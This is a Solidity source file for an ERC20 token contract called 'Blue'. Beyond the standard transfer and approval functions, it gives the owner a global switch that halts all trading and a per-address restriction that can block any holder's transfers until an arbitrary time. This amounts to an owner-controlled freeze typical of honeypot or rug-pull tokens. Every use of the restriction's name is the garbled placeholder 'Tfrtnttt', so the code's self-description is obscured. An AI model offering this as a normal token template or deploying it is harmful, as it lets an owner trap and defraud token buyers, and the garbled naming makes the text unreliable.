pragma solidity ^0.8.5;

// Interface for ERC20 Token Standard, which defines the essential functions and events.
interface IERC20 {
    function totalSupply() external view returns (uint256); // Returns the total token supply.
    function balanceOf(address account) external view returns (uint256); // Returns the account balance of another account with address `account`.
    function transfer(address recipient, uint256 amount) external returns (bool); // Transfers `amount` tokens to `recipient`, returns true on success.
    function allowance(address owner, address spender) external view returns (uint256); // Returns the amount of tokens that `spender` is still allowed to withdraw from `owner`.
    function approve(address spender, uint256 amount) external returns (bool); // Allows `spender` to withdraw from your account multiple times, up to the `amount`. If this function is called again it overwrites the current allowance with `amount`.
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); // Transfers `amount` tokens from `sender` to `recipient`.
    event Transfer(address indexed from, address indexed to, uint256 value); // Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
    event Approval(address indexed owner, address indexed spender, uint256 value); // Emitted when the allowance of a `spender` for an `owner` is set by a call to `approve`. `value` is the new allowance.
}

// Provides basic access control mechanism, where there is an account (an owner) that can be granted exclusive access to specific functions.
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender); // Returns the sender of the message (current call).
    }
}

// Contract module which provides a basic access control mechanism, where there is an account (an owner) that can be granted exclusive access to specific functions.
contract Ownable is Context {
    address private _owner; // Variable to store the owner's address.

    // Event to indicate ownership transfer, `previousOwner` is the address of the previous owner, `newOwner` is the address of the new owner.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Constructor sets the original `owner` of the contract to the sender account.
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    // Function to view the current owner.
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Modifier to check if the caller is the owner of the contract.
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Function to relinquish control of the contract. It leaves the contract without an owner, thereby removing any functionality that is only available to the owner.
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Function to transfer ownership of the contract to a new account (`newOwner`). Can only be called by the current owner.
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// Contract for a custom ERC20 token with additional functionalities like trading control and transfer Tfrtnttts.
contract Blue is Context, IERC20, Ownable {
    // Mapping to store the balances of each account.
    mapping (address => uint256) private _balances;

    // Mapping to store the allowances given to third parties to spend tokens on behalf of the token holder.
    mapping (address => mapping (address => uint256)) private _allowances;

    // Mapping to store transfer Tfrtnttts (e.g., time-based Tfrtnttts).
    mapping (address => uint256) private _transferTfrtnttts;

    // Flag to control if trading is enabled or disabled.
    bool private _tradingEnabled = true;

    // Token attributes.
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    // Constructor to set initial values for name, symbol, decimals, and total supply.
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** uint256(decimals_));
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // Function to enable or disable trading. Can only be called by the owner.
    function setTradingEnabled(bool enabled) public onlyOwner {
        _tradingEnabled = enabled;
    }

    // Function to check if trading is enabled.
    function isTradingEnabled() public view returns (bool) {
        return _tradingEnabled;
    }

    // Function to set transfer Tfrtnttt for a specific account. Can only be called by the owner.
    function setTransferTfrtnttt(address account, uint256 time) public onlyOwner {
        require(account != address(0), "Cannot set Tfrtnttt for the zero address");
        _transferTfrtnttts[account] = time;
    }

    // Function to remove transfer Tfrtnttt for a specific account. Can only be called by the owner.
    function removeTransferTfrtnttt(address account) public onlyOwner {
        require(account != address(0), "Cannot remove Tfrtnttt for the zero address");
        delete _transferTfrtnttts[account];
    }

    // Function to view the transfer Tfrtnttt time for a specific account.
    function getTfrtntttTime(address account) public view returns (uint256) {
        require(account != address(0), "Cannot query Tfrtnttt time for the zero address");
        return _transferTfrtnttts[account];
    }

    // ERC20 standard functions.
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    // Customized transfer function which also checks for trading enabled and transfer Tfrtnttts.
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingEnabled, "Trading is currently disabled");
        require(_balances[_msgSender()] >= amount, "Transfer amount exceeds balance");
        require(block.timestamp >= _transferTfrtnttts[_msgSender()], "Transfer is currently restricted for this address");

        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;
        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    // ERC20 standard functions for allowance and approval.
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    // Customized transferFrom function which also checks for trading enabled and transfer Tfrtnttts.
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(_tradingEnabled, "Trading is currently disabled");
        require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");
        require(_balances[sender] >= amount, "Transfer amount exceeds balance");
        require(block.timestamp >= _transferTfrtnttts[sender], "Transfer is currently restricted for this address");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}